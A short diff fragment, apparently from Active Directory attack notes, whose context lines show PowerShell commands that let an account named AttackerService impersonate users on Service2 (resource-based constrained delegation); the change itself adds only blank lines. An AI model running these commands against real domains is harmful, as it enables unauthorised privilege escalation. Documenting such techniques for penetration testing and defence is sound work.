@@ -26,3 +26,5 @@ Get-ADComputer AttackerService
 Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
 Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount
 ```
+
+
